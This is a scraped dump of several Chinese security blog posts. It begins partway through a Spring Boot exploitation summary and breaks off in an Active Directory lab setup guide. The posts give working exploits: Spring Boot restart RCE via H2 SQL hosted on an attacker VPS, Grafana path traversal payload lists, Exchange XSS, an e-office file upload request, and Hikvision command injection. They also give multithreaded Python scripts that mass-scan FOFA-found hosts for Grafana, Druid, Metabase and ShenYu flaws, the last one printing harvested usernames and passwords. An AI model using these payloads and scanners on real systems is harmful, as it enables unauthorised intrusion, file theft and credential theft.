h2database、spring-boot-starter-data-jpa 相关依赖 ⚠️ 目标可以请求攻击者的 HTTP 服务器（请求可出外网），否则 restart 会导致程序异常退出 ⚠️ HTTP 服务器如果返回含有畸形 h2 sql 语法内容的文件，会导致程序异常退出  利用方法： 步骤一：托管 sql 文件 在自己控制的 vps 机器上开启一个简单 HTTP 服务器，端口尽量使用常见 HTTP 服务端口（80、443）\n# 使用 python 快速开启 http server python2 -m SimpleHTTPServer 80 python3 -m http.server 80  在根目录放置以任意名字的文件，内容为需要执行的 h2 sql 代码，比如：\n ⚠️ 下面payload 中的 \u0026lsquo;T5\u0026rsquo; 方法只能 restart 执行一次；后面 restart 需要更换新的方法名称 (如 T6) 和设置新的 sql URL 地址，然后才能被 restart 重新使用，否则第二次 restart 重启应用时会导致程序异常退出\n CREATE ALIAS T5 AS CONCAT('void ex(String m1,String m2,String m3)throws Exception{Runti','me.getRun','time().exe','c(new String[]{m1,m2,m3});}');CALL T5('/bin/bash','-c','open -a Calculator');  步骤二：设置 spring.datasource.data 属性 spring 1.x\nPOST /env Content-Type: application/x-www-form-urlencoded spring.datasource.data=http://your-vps-ip/example.sql  spring 2.x\nPOST /actuator/env Content-Type: application/json {\u0026quot;name\u0026quot;:\u0026quot;spring.datasource.data\u0026quot;,\u0026quot;value\u0026quot;:\u0026quot;http://your-vps-ip/example.sql\u0026quot;}  步骤三：重启应用 spring 1.x\nPOST /restart Content-Type: application/x-www-form-urlencoded  spring 2.x\nPOST /actuator/restart Content-Type: application/json  漏洞原理：  目标机器可以通过 spring.datasource.data 属性来设置 jdbc DML sql 文件的 URL 地址 restart 重启应用后，程序会请求设置的 URL 地址 spring-boot-autoconfigure 组件中的 org.springframework.boot.autoconfigure.jdbc.DataSourceInitializer.java 文件代码逻辑中会使用 runScripts 方法执行请求 URL 内容中的 h2 database sql 代码，造成 RCE 漏洞  漏洞环境： repository/springboot-restart-rce\n正常访问：\nhttp://127.0.0.1:9098/actuator/env  ","id":19,"section":"posts","summary":"Spring Boot 相关漏洞学习资料，利用方法和技巧合集，黑盒安全评估 check list 文章转载至：https://github.com/LandGrey/SpringB","tags":["web安全"],"title":"SpringBoot漏洞利用总结","uri":"https://ad-calcium.github.io/2021/12/springboot%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/","year":"2021"},{"content":"0x01 漏洞详情 Grafana是一个跨平台、开源的数据可视化网络应用程序平台。用户配置连接的数据源之后，Grafana可以在网络浏览器里显示数据图表和警告。\n国外安全研究人员披露Grafana中某些接口在提供静态文件时，攻击者通过构造恶意请求，可造成目录遍历，读取系统上的文件。\n0x02 影响版本 Grafana 8.x 系列\r 0x03 FOFA 语法 app=\u0026quot;Grafana\u0026quot;\r 0x04 漏洞复现 漏洞的payload\nhttp://ip/public/plugins/icon/../../../../../../../../../../../../../../../../../../etc/passwd\r 读/etc/passwd只能测试是否存在漏洞，要想利用的话目前比较有实际情况的就是读取db文件\nhttp://IP/public/plugins/icon/../../../../../../../../../../../../../../../../../../var/lib/grafana/grafana.db\r 读取key，默认的secret_key = SW2YcwTIb9zpOOhoPsMm\nhttp://110.40.169.81:3000/public/plugins/icon/../../../../../../../../../../../../../../../../../../etc/grafana/grafana.ini\r 解密脚本：https://github.com/A-D-Team/grafanaExp\n解密grafana.db文件\n./grafanaExp exp -u http://42.193.127.40:3000/\r Nginx反向代理400绕过\nhttps://IP/public/plugins/welcome/../#/../../../../../../../../../../../../../../../../../../etc/passwd\r 以下paylad均可以\n/public/plugins/alertGroups/../../../../../../../../etc/passwd\r/public/plugins/alertlist/../../../../../../../../etc/passwd\r/public/plugins/alertmanager/../../../../../../../../etc/passwd\r/public/plugins/annolist/../../../../../../../../etc/passwd\r/public/plugins/barchart/../../../../../../../../etc/passwd\r/public/plugins/bargauge/../../../../../../../../etc/passwd\r/public/plugins/canvas/../../../../../../../../etc/passwd\r/public/plugins/cloudwatch/../../../../../../../../etc/passwd\r/public/plugins/dashboard/../../../../../../../../etc/passwd\r/public/plugins/dashlist/../../../../../../../../etc/passwd\r/public/plugins/debug/../../../../../../../../etc/passwd\r/public/plugins/elasticsearch/../../../../../../../../etc/passwd\r/public/plugins/gauge/../../../../../../../../etc/passwd\r/public/plugins/geomap/../../../../../../../../etc/passwd\r/public/plugins/gettingstarted/../../../../../../../../etc/passwd\r/public/plugins/grafana-azure-monitor-datasource/../../../../../../../../etc/passwd\r/public/plugins/grafana/../../../../../../../../etc/passwd\r/public/plugins/graph/../../../../../../../../etc/passwd\r/public/plugins/graphite/../../../../../../../../etc/passwd\r/public/plugins/heatmap/../../../../../../../../etc/passwd\r/public/plugins/histogram/../../../../../../../../etc/passwd\r/public/plugins/influxdb/../../../../../../../../etc/passwd\r/public/plugins/jaeger/../../../../../../../../etc/passwd\r/public/plugins/live/../../../../../../../../etc/passwd\r/public/plugins/logs/../../../../../../../../etc/passwd\r/public/plugins/loki/../../../../../../../../etc/passwd\r/public/plugins/mixed/../../../../../../../../etc/passwd\r/public/plugins/mssql/../../../../../../../../etc/passwd\r/public/plugins/mysql/../../../../../../../../etc/passwd\r/public/plugins/news/../../../../../../../../etc/passwd\r/public/plugins/nodeGraph/../../../../../../../../etc/passwd\r/public/plugins/opentsdb/../../../../../../../../etc/passwd\r/public/plugins/piechart/../../../../../../../../etc/passwd\r/public/plugins/pluginlist/../../../../../../../../etc/passwd\r/public/plugins/postgres/../../../../../../../../etc/passwd\r/public/plugins/prometheus/../../../../../../../../etc/passwd\r/public/plugins/stat/../../../../../../../../etc/passwd\r/public/plugins/state-timeline/../../../../../../../../etc/passwd\r/public/plugins/status-history/../../../../../../../../etc/passwd\r/public/plugins/table-old/../../../../../../../../etc/passwd\r/public/plugins/table/../../../../../../../../etc/passwd\r/public/plugins/tempo/../../../../../../../../etc/passwd\r/public/plugins/testdata/../../../../../../../../etc/passwd\r/public/plugins/text/../../../../../../../../etc/passwd\r/public/plugins/timeseries/../../../../../../../../etc/passwd\r/public/plugins/welcome/../../../../../../../../etc/passwd\r/public/plugins/xychart/../../../../../../../../etc/passwd\r/public/plugins/zipkin/../../../../../../../../etc/passwd\r/public/plugins/alertmanager/../../../../../../../../etc/passwd\r/public/plugins/cloudwatch/../../../../../../../../etc/passwd\r/public/plugins/dashboard/../../../../../../../../etc/passwd\r/public/plugins/elasticsearch/../../../../../../../../etc/passwd\r/public/plugins/grafana/../../../../../../../../etc/passwd\r/public/plugins/grafana-azure-monitor-datasource/../../../../../../../../etc/passwd\r/public/plugins/graphite/../../../../../../../../etc/passwd\r/public/plugins/influxdb/../../../../../../../../etc/passwd\r/public/plugins/jaeger/../../../../../../../../etc/passwd\r/public/plugins/loki/../../../../../../../../etc/passwd\r/public/plugins/mixed/../../../../../../../../etc/passwd\r/public/plugins/mssql/../../../../../../../../etc/passwd\r/public/plugins/mysql/../../../../../../../../etc/passwd\r/public/plugins/opentsdb/../../../../../../../../etc/passwd\r/public/plugins/postgres/../../../../../../../../etc/passwd\r/public/plugins/prometheus/../../../../../../../../etc/passwd\r/public/plugins/tempo/../../../../../../../../etc/passwd\r/public/plugins/testdata/../../../../../../../../etc/passwd\r/public/plugins/zipkin/../../../../../../../../etc/passwd\r/public/plugins/alertGroups/../../../../../../../../etc/passwd\r/public/plugins/alertlist/../../../../../../../../etc/passwd\r/public/plugins/annolist/../../../../../../../../etc/passwd\r/public/plugins/barchart/../../../../../../../../etc/passwd\r/public/plugins/bargauge/../../../../../../../../etc/passwd\r/public/plugins/canvas/../../../../../../../../etc/passwd\r/public/plugins/dashlist/../../../../../../../../etc/passwd\r/public/plugins/debug/../../../../../../../../etc/passwd\r/public/plugins/gauge/../../../../../../../../etc/passwd\r/public/plugins/geomap/../../../../../../../../etc/passwd\r/public/plugins/gettingstarted/../../../../../../../../etc/passwd\r/public/plugins/graph/../../../../../../../../etc/passwd\r/public/plugins/heatmap/../../../../../../../../etc/passwd\r/public/plugins/histogram/../../../../../../../../etc/passwd\r/public/plugins/live/../../../../../../../../etc/passwd\r/public/plugins/logs/../../../../../../../../etc/passwd\r/public/plugins/news/../../../../../../../../etc/passwd\r/public/plugins/nodeGraph/../../../../../../../../etc/passwd\r/public/plugins/piechart/../../../../../../../../etc/passwd\r/public/plugins/pluginlist/../../../../../../../../etc/passwd\r/public/plugins/stat/../../../../../../../../etc/passwd\r/public/plugins/state-timeline/../../../../../../../../etc/passwd\r/public/plugins/status-history/../../../../../../../../etc/passwd\r/public/plugins/table/../../../../../../../../etc/passwd\r/public/plugins/table-old/../../../../../../../../etc/passwd\r/public/plugins/text/../../../../../../../../etc/passwd\r/public/plugins/timeseries/../../../../../../../../etc/passwd\r/public/plugins/welcome/../../../../../../../../etc/passwd\r/public/plugins/xychart/../../../../../../../../etc/passwd\r 0x05 批量poc # -*- coding: utf-8 -*-\r# @Time ： 2021/12/7 21:30\r# @Auth ： AD钙奶\rimport requests\rimport threadpool\rrequests.packages.urllib3.disable_warnings()\rdef verify(urls):\rurl = urls + '/public/plugins/icon/../../../../../../../../../../../../../../../../../../etc/passwd'\rheaders = {\u0026quot;User-Agent\u0026quot;: \u0026quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36\u0026quot;}\rtry:\rres = requests.get(url, headers=headers, timeout=10, verify=False, allow_redirects=False)\rif 'root❌0' in res.text:\r# print(res.text)\rinfo = \u0026quot;[+] 存在CVE-2021-43798 Grafana未授权文件读取漏洞: \u0026quot; + urls\rsave_vuln(info)\rprint(info)\rexcept Exception as e:\r# print(e)\rpass\rdef save_vuln(info):\rvuln = info + '\\n'\rwith open(\u0026quot;vuln.txt\u0026quot;, 'a', encoding='utf-8') as ff:\rff.write(vuln)\rdef get_file_url():\rwith open(\u0026quot;url.txt\u0026quot;, 'r', encoding='UTF-8') as f:\r_urls = f.readlines()\rurls = [url.strip() for url in _urls if url and url.strip()]\rreturn urls\rdef main():\rurl = get_file_url()\rpool = threadpool.ThreadPool(200)\rres = threadpool.makeRequests(verify, url)\r[pool.putRequest(req) for req in res]\rpool.wait()\rif __name__ == \u0026quot;__main__\u0026quot;:\rmain()\r 0x06 参考文章 https://mp.weixin.qq.com/s/dqJ3F_fStlj78S0qhQ3Ggw\rhttps://mp.weixin.qq.com/s/QodZWlBCnxfgIZNo6pjenA\rhttps://github.com/jas502n/Grafana-CVE-2021-43798\r ","id":20,"section":"posts","summary":"0x01 漏洞详情 Grafana是一个跨平台、开源的数据可视化网络应用程序平台。用户配置连接的数据源之后，Grafana可以在网络浏览器里显示数据图","tags":["漏洞复现"],"title":"Grafana任意文件读取漏洞(CVE-2021-43798)","uri":"https://ad-calcium.github.io/2021/12/grafana%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9Ecve-2021-43798/","year":"2021"},{"content":"0x01 漏洞说明 Exchange 最近爆出了一个XSS漏洞，编号：CVE-2021-41349，哎哎哎，别走啊，虽然只是一个反射型XSS，但是它发生在Exchange上影响也算大了，并且发现这漏洞的老哥说他是玩Proxyshell时无意中发现，当然了赏金也是0$\n漏洞点位于：autodiscover/autodiscover.json\n0x02 影响版本 \u0026lt;= Exchange 2013 update 23\r\u0026lt;= Exchange 2016 update 22\r\u0026lt;= Exchange 2019 update 11\r 0x03 漏洞复现 Fofa搜索标题：（注意：互联网的非授权利用属于违法行为）\napp=\u0026quot;Microsoft-Exchange\u0026quot;\r 0x04 漏洞复现 访问exchange\n访问以下接口，即可触发xss漏洞\nhttps://IP/autodiscover/autodiscover.json\r\u0026lt;script\u0026gt;alert(1);+\u0026quot;=\u0026lt;/script\u0026gt;\r 仅仅使用常规的的payload会因为字符的限制会被添加\u0026quot;\u0026hellip;.\u0026ldquo;进行压缩\n只需要添加 ;+=\u0026rdquo; 进行突破限制和强制进行双引号闭合即可\n0x05 参考链接 https://mp.weixin.qq.com/s/1f5UFNBUbTYV7-PdijsTkQ\r ","id":21,"section":"posts","summary":"0x01 漏洞说明 Exchange 最近爆出了一个XSS漏洞，编号：CVE-2021-41349，哎哎哎，别走啊，虽然只是一个反射型XSS，但是它发生在Exchan","tags":["exchange系列"],"title":"Exchange XSS(CVE-2021-41349)","uri":"https://ad-calcium.github.io/2021/11/exchange-xsscve-2021-41349/","year":"2021"},{"content":"0x01 漏洞详情 该漏洞为未公开漏洞 CNVD-2021-49104，该漏洞是由于 e-office 未能正确处理上传模块中用户输入导致的，攻击者可以构造恶意的上传数据包，实现任意代码执行。\n0x02 漏洞影响 泛微 e-office v9.0\r 0x03 fofa语法 app=\u0026quot;泛微-EOffice\u0026quot;\r 0x04 漏洞复现 漏洞的poc\nPOST /general/index/UploadFile.php?m=uploadPicture\u0026amp;uploadType=eoffice_logo\u0026amp;userId= HTTP/1.1\rHost: 112.74.126.143\rUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\rAccept-Encoding: gzip, deflate\rAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\rConnection: close\rAccept-Language: zh-CN,zh-TW;q=0.9,zh;q=0.8,en-US;q=0.7,en;q=0.6\rCookie: LOGIN_LANG=cn; PHPSESSID=0acfd0a2a7858aa1b4110eca1404d348\rContent-Length: 192\rContent-Type: multipart/form-data; boundary=e64bdf16c554bbc109cecef6451c26a4\r--e64bdf16c554bbc109cecef6451c26a4\rContent-Disposition: form-data; name=\u0026quot;Filedata\u0026quot;; filename=\u0026quot;test.php\u0026quot;\rContent-Type: image/jpeg\r\u0026lt;?php phpinfo();?\u0026gt;\r--e64bdf16c554bbc109cecef6451c26a4--\r 上传成功后访问 /images/logo/logo-eoffice.php\n0x05 漏洞分析 由于木有源代码，以下部分的图来自peqi师傅\n当ploadType 参数设为 eoffice_logo时，targetpath参数为文件的路径，ext获取文件的后缀名，拼接到log-eoffice中，由于未对用户用户上传图片进行过滤，导致任意文件上传\n0x06 参考地址\nhttps://mp.weixin.qq.com/s/uAhcQ8O1HKHZ6JLZ_pmNzg\r ","id":22,"section":"posts","summary":"0x01 漏洞详情 该漏洞为未公开漏洞 CNVD-2021-49104，该漏洞是由于 e-office 未能正确处理上传模块中用户输入导致的，攻击者可以构造恶意的上传数据","tags":["漏洞复现"],"title":"E-Office v9任意文件上传漏洞","uri":"https://ad-calcium.github.io/2021/11/e-office-v9%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/","year":"2021"},{"content":"0x01 组件介绍 Apache Druid 是一个分布式的、支持实时多维 OLAP 分析的数据处理系统。它既支持高速的数据实时摄入处理，也支持实时且灵活的多维数据分析查询。因此 Druid 最常用的场景就是大数据背景下、灵活快速的多维 OLAP 分析。Druid 还支持根据时间戳对数据进行预聚合摄入和聚合分析，因此也有用户经常在有时序数据处理分析的场景中使用。\n0x02 漏洞详情 该漏洞是由于用户指定 HTTP InputSource 没有做出限制，可以通过将文件 URL 传递给 HTTP InputSource 来绕过应用程序级别的限制。攻击者可利用该漏洞在未授权情况下，构造恶意请求执行文件读取，最终造成服务器敏感性信息泄露。\n0x03 影响范围 Apache Druid \u0026lt; 0.22.0\r 0x04 fofa语法 title=\u0026quot;Apache Druid\u0026quot;\r 0x05 漏洞复现 点击“load data”\n选择\u0026quot;http(s)://\u0026quot;\u0026ndash;\u0026gt;\u0026ldquo;connect data\u0026rdquo;\n在URLs中输入以下内容\nfile:///etc/passwd\r 成功获取/etc/passwd中的内容\n脚本批量\n# -*- coding: utf-8 -*-\r# @Time ： 2021/11/21 17:15\r# @Auth ： AD钙奶\rimport requests\rimport threadpool\rrequests.packages.urllib3.disable_warnings()\rdef verify(urls):\rurl = urls + '/druid/indexer/v1/sampler?for=connect'\rheaders = {\u0026quot;User-Agent\u0026quot;: \u0026quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36\u0026quot;}\rjson_data = {\u0026quot;type\u0026quot;: \u0026quot;index\u0026quot;, \u0026quot;spec\u0026quot;: {\u0026quot;type\u0026quot;: \u0026quot;index\u0026quot;, \u0026quot;ioConfig\u0026quot;: {\u0026quot;type\u0026quot;: \u0026quot;index\u0026quot;, \u0026quot;firehose\u0026quot;: {\u0026quot;type\u0026quot;: \u0026quot;http\u0026quot;, \u0026quot;uris\u0026quot;: [\u0026quot;file:///etc/passwd\u0026quot;]}}, \u0026quot;dataSchema\u0026quot;: {\u0026quot;dataSource\u0026quot;: \u0026quot;sample\u0026quot;, \u0026quot;parser\u0026quot;: {\u0026quot;type\u0026quot;: \u0026quot;string\u0026quot;, \u0026quot;parseSpec\u0026quot;: {\u0026quot;format\u0026quot;: \u0026quot;regex\u0026quot;, \u0026quot;pattern\u0026quot;: \u0026quot;(.*)\u0026quot;, \u0026quot;columns\u0026quot;: [\u0026quot;a\u0026quot;], \u0026quot;dimensionsSpec\u0026quot;: {}, \u0026quot;timestampSpec\u0026quot;: {\u0026quot;column\u0026quot;: \u0026quot;!!!_no_such_column_!!!\u0026quot;, \u0026quot;missingValue\u0026quot;: \u0026quot;2010-01-01T00:00:00Z\u0026quot;}}}}}, \u0026quot;samplerConfig\u0026quot;: {\u0026quot;numRows\u0026quot;: 500, \u0026quot;timeoutMs\u0026quot;: 15000}}\rtry:\rres = requests.post(url, headers=headers, json=json_data, timeout=10, verify=False, allow_redirects=False)\rif 'root❌0' in res.text:\rinfo = \u0026quot;[+] 存在CVE-2021-36749漏洞: \u0026quot; + urls\rsave_vuln(info)\rprint(info)\rexcept Exception as e:\rpass\rdef save_vuln(info):\rvuln = info + '\\n'\rwith open(\u0026quot;vuln.txt\u0026quot;, 'a', encoding='utf-8') as ff:\rff.write(vuln)\rdef get_file_url():\rwith open(\u0026quot;url.txt\u0026quot;, 'r', encoding='UTF-8') as f:\r_urls = f.readlines()\rurls = [url.strip() for url in _urls if url and url.strip()]\rreturn urls\rdef main():\rurl = get_file_url()\rpool = threadpool.ThreadPool(50)\rres = threadpool.makeRequests(verify, url)\r[pool.putRequest(req) for req in res]\rpool.wait()\rif __name__ == \u0026quot;__main__\u0026quot;:\rmain()\r ","id":23,"section":"posts","summary":"0x01 组件介绍 Apache Druid 是一个分布式的、支持实时多维 OLAP 分析的数据处理系统。它既支持高速的数据实时摄入处理，也支持实时且灵活的多维数据分析查询。因此 Druid 最","tags":["漏洞复现"],"title":"Apache Druid 任意文件读取漏洞(CVE-2021-36749)","uri":"https://ad-calcium.github.io/2021/11/apache-druid-loaddata%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9Ecve-2021-36749/","year":"2021"},{"content":"0x01 漏洞详情 ShenYu（原名 Soul）是一款高性能，响应式的网关，同时也是应用于所有微服务场景的，可扩展、高性能、响应式的 API 网关解决方案。\n该框架由于JWT认证的不正确使用，导致Apache ShenYu 2.3.0和2.4.0版本，攻击者可以绕过身份验证，直接进入目标系统后台。\n0x02 影响版本 Apache ShenYu 2.3.0\rApache ShenYu 2.4.0\r 0x03 fofa语法 body=\u0026quot;id=\\\u0026quot;httpPath\\\u0026quot;\u0026quot; \u0026amp;\u0026amp; body=\u0026quot;th:text=\\\u0026quot;${domain}\\\u0026quot;\u0026quot;\r 0x04 环境搭建 docker pull apache/shenyu-admin:2.4.0\rdocker run -d -p 9095:9095 apache/shenyu-admin:2.4.0\r 0x05 漏洞复现 poc\nhttp://ip/dashboardUser\r 访问dashboardUser即可看到用户名和密码，通过该密码可登陆后台。\n0x06 批量poc # -*- coding: utf-8 -*-\r# @Time ： 2021/11/23 9:04\r# @Auth ： AD钙奶\rimport requests\rimport threadpool\rrequests.packages.urllib3.disable_warnings()\rdef verify(urls):\rurl = urls + '/dashboardUser'\rheaders = {\u0026quot;User-Agent\u0026quot;: \u0026quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36\u0026quot;}\rtry:\rres = requests.get(url=url, headers=headers, verify=False, timeout=5)\rif res.status_code == 200 and \u0026quot;query dashboard users success\u0026quot; in res.text:\rif res.json()['data']['dataList']:\rprint(f\u0026quot;\\033[31m[+] 目标系统: {url} 存在JWT缺陷漏洞（CVE-2021-37580）\\033[0m\u0026quot;)\rnum = 1\rfor i in res.json()['data']['dataList']:\rprint(f\u0026quot;\\033[31m[{num}] 存在账号:{i['userName']} 密码:{i['password']} \\033[0m\u0026quot;)\rnum = num + 1\rexcept Exception as e:\rpass\rdef get_file_url():\rwith open(\u0026quot;url.txt\u0026quot;, 'r', encoding='UTF-8') as f:\r_urls = f.readlines()\rurls = [url.strip() for url in _urls if url and url.strip()]\rreturn urls\rdef main():\rurl = get_file_url()\rpool = threadpool.ThreadPool(5)\rres = threadpool.makeRequests(verify, url)\r[pool.putRequest(req) for req in res]\rpool.wait()\rif __name__ == \u0026quot;__main__\u0026quot;:\rmain()\r ","id":24,"section":"posts","summary":"0x01 漏洞详情 ShenYu（原名 Soul）是一款高性能，响应式的网关，同时也是应用于所有微服务场景的，可扩展、高性能、响应式的 API 网关解决方案。 该","tags":["漏洞复现"],"title":"Apache ShenYu JWT认证缺陷漏洞(CVE-2021-37580)","uri":"https://ad-calcium.github.io/2021/11/apache-shenyu-jwt%E8%AE%A4%E8%AF%81%E7%BC%BA%E9%99%B7%E6%BC%8F%E6%B4%9Ecve-2021-37580/","year":"2021"},{"content":"0x01 漏洞描述 metabase 是一个简单、开源的数据分析平台。自定义 GeoJSON 地图（admin-\u0026gt;settings-\u0026gt;maps-\u0026gt;custom maps-\u0026gt;add a map）操作缺少权限验证，攻击者可通过该漏洞获得敏感信息。\n0x02 影响范围 影响版本：\nmetabase version \u0026lt; 0.40.5\rmetabase version \u0026gt;= 1.0.0, \u0026lt; 1.40.5\r 0x03 FOFA 查询 app=\u0026quot;metabase\u0026quot;\r 0x04 环境搭建 docker run -d -p 3000:3000 --name metabase metabase/metabase:v0.40.4\r 0x05 漏洞复现 /api/geojson?url=file:/etc/passwd\r 0x06 批量脚本 # -*- coding: utf-8 -*-\r# @Time ： 2021/11/21 17:37\r# @Auth ： AD钙奶\rimport requests\rimport threadpool\rrequests.packages.urllib3.disable_warnings()\rdef verify(urls):\rurl = urls + '/api/geojson?url=file:/etc/passwd'\rheaders = {\u0026quot;User-Agent\u0026quot;: \u0026quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36\u0026quot;}\rtry:\rres = requests.get(url, headers=headers, timeout=10, verify=False, allow_redirects=False)\rif 'root' in res.text:\rinfo = \u0026quot;[+] 存在CVE-2021-36749漏洞: \u0026quot; + urls\rsave_vuln(info)\rprint(info)\rexcept Exception as e:\r# print(e)\rpass\rdef save_vuln(info):\rvuln = info + '\\n'\rwith open(\u0026quot;vuln.txt\u0026quot;, 'a', encoding='utf-8') as ff:\rff.write(vuln)\rdef get_file_url():\rwith open(\u0026quot;url.txt\u0026quot;, 'r', encoding='UTF-8') as f:\r_urls = f.readlines()\rurls = [url.strip() for url in _urls if url and url.strip()]\rreturn urls\rdef main():\rurl = get_file_url()\rpool = threadpool.ThreadPool(200)\rres = threadpool.makeRequests(verify, url)\r[pool.putRequest(req) for req in res]\rpool.wait()\rif __name__ == \u0026quot;__main__\u0026quot;:\rmain()\r 0x07 参考链接 https://mp.weixin.qq.com/s/XNwQuALcVmaK5Zb-3mTBzA\r ","id":25,"section":"posts","summary":"0x01 漏洞描述 metabase 是一个简单、开源的数据分析平台。自定义 GeoJSON 地图（admin-\u0026gt;settings-\u0026gt;maps-\u0026gt;custom maps-\u0026gt;add a m","tags":["漏洞复现"],"title":"Metabase 敏感信息泄露漏洞(CVE-2021-41277)","uri":"https://ad-calcium.github.io/2021/11/metabase-%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9Ecve-2021-41277/","year":"2021"},{"content":"0x01 漏洞描述 海康威视IP摄像机/NVR设备固件中发现一个未认证的远程代码执行漏洞\n0x02 影响版本 漏洞影响IP摄像头和NVR设备固件，其中包括2021年6月的最新固件以及2006年发布的固件。\n0x03 搜索语法 app=\u0026quot;HIKVISION-视频监控\u0026quot; \u0026amp;\u0026amp; status_code=\u0026quot;200\u0026quot; \u0026amp;\u0026amp; after=\u0026quot;2021-07-10\u0026quot;\r 0x04 漏洞复现 漏洞点位于: /SDK/webLanguage\n利用PUT方法上传xml数据：\n\u0026lt;?xml version=\u0026quot;1.0\u0026quot; encoding=\u0026quot;UTF-8\u0026quot;?\u0026gt;\u0026lt;language\u0026gt;$({{Command}}\u0026gt;webLib/{{lib}})\u0026lt;/language\u0026gt;\r 漏洞的poc\nPUT /SDK/webLanguage HTTP/1.1\rHost: host\rUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36\rContent-Length: 95\rContent-Type: application/x-www-form-urlencoded\rX-Requested-With: XMLHttpRequest\rAccept-Encoding: gzip, deflate\rConnection: close\r\u0026lt;?xml version=\u0026quot;1.0\u0026quot; encoding=\u0026quot;UTF-8\u0026quot;?\u0026gt;\u0026lt;language\u0026gt;$(ls -l \u0026gt; webLib/x)\u0026lt;/language\u0026gt;\r 查看文件并写入到xx3中\n访问xx3则可看到当前目录下的文件\n","id":26,"section":"posts","summary":"0x01 漏洞描述 海康威视IP摄像机/NVR设备固件中发现一个未认证的远程代码执行漏洞 0x02 影响版本 漏洞影响IP摄像头和NVR设备固件，其中包括2021","tags":["漏洞复现"],"title":"海康威视-IP摄像机 远程代码执行漏洞(CVE-2021-36260)","uri":"https://ad-calcium.github.io/2021/11/%E6%B5%B7%E5%BA%B7%E5%A8%81%E8%A7%86-ip%E6%91%84%E5%83%8F%E6%9C%BA-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9Ecve-2021-36260/","year":"2021"},{"content":"主机信息    用途 操作系统 主机名 域名 IP地址 DNS     根域 windows 2012 DC1 adlab.com 10.10.10.50 127.0.0.1   辅域 windows 2019 DC4 adlab.com 10.10.10.20 127.0.0.1和10.10.10.50   子域 windows 2012 DC2 sec.adlab.com 10.10.11.50 127.0.0.1和10.10.10.50   树域 windows 2012 DC3 ad.com 10.10.12.50 127.0.0.1和10.10.10.50    一、安装域控 1、准备工作 如果域内主机都是克隆过来的，则需要重置SID。因为克隆过来的SID一样 （SID可以在cmd中whoami/all查看）所以每一次克隆后都要进行这一步在win+r 进行搜索sysprep 双击 等待重启\n2、修改主机名 3、安装域 打开服务器管理器，添加角色和功能。\n出现“添加角色和功能”界面，下一步 。\n根据提示操作，下一步。\n选择添加AD域服务（Active Directory 域服务），同时添加所需功能。\n根据提示操作，下一步\n根据提示操作，下一步\n根据提示操作，安装\n等待安装完成\n安装完成\n4、配置域 点击服务器管理器左侧“AD DS” 、点击黄色提示部分中的更多。\n进入AD域服务器配置向导，选择 “添加新林” ，输入域，点击下一步。\n填写密码，下一步 。\n提示DNS无法创建，不用管，继续下一步\n根据提示操作，下一步\n安装路径，默认，下一步\n查看选项，默认，下一步\n点击安装 。此过程可能会报错，提示登陆用户没有设置密码，去设置给当前登陆用户（Administrator）设置一个密码，然后回来点击 “重新运行先决条件检查” 即可！\n安装完成，会提示注销重启 （此过程比较漫长，耐心等待）\n重启之后存在以下几个说明安装成功\n接下来我们需要同步配置一下域控制器的 DNS 区域传输：\n现在主域控制器和 DNS 集成，为了让后期搭建完辅域控制器的 DNS 同步主域控制器 DNS ，需要把主域控制器的 DNS 服务器_msdcs.adlab.com和 adlab.com 的起始授权机构(SOA)区域传送设置成允许:\n5、新建域管理员 打开\u0026quot;Active Directory 用户和计算机\u0026quot;\n选择Users,新建用户\n输入\u0026quot;用户登录名\u0026quot;\n输入密码，点击\u0026quot;密码永不过期\u0026quot;\n点击完成\n找到刚刚新建的用户，右键选择\u0026quot;属性\u0026quot;\n将用户新增管理员组，点击添加\n点击\u0026quot;高级\u0026quot;\n点击\u0026quot;立即查找\u0026quot;\n依次添加以下三个组\nDomain Admins; Enterprise Admins; Schema Admins\n添加之后，点击完成\n二、辅域搭建 1、修改主机名 2、修改DNS 3、安装域 出现“添加角色和功能”界面，下一步 。\n根据提示操作，下一步。\n选择添加AD域服务（Active Directory 域服务），同时添加所需功能。\n根据提示操作，下一步\n根据提示操作，下一步\n根据提示操作，安装\n等待安装完成\n安装完成\n4、配置域 点击服务器管理器左侧“AD DS” 、点击黄色提示部分中的更多。\n填写刚才新建具有权限的用户，不使用默认的administrator\n选择域，确定\n完成域确认后，下一步\n保持默认，填写还原模式密码\n下一步\n选择dc01（由于测试环境，没有任何数据，此处不需要“从介质安装”，多站点，数据库文件大时，使用该项）\n默认路径，下一步\n下一步\n安装\n安装完成后，重启\n登录\n安装后用户和计算机、站点和服务中，都看到了二台域控制器。\n到些主辅二台域控制器搭建完成\n二、子域控制器搭建 搭建子域的操作系统只能大于等于根域的操作系统，不能低于根域的操作系统，这里我推荐都用相同的操作系统。\n1、修改主机名 首先修改主机名\n2、修改DNS 1、搭建⼦域控制器前需要先把 DNS 指向主域控制器的 IP地址，然后委派完DNS再把⼦域控制器DNS指向⾃⼰：\n⽗域控制器：adlab.com 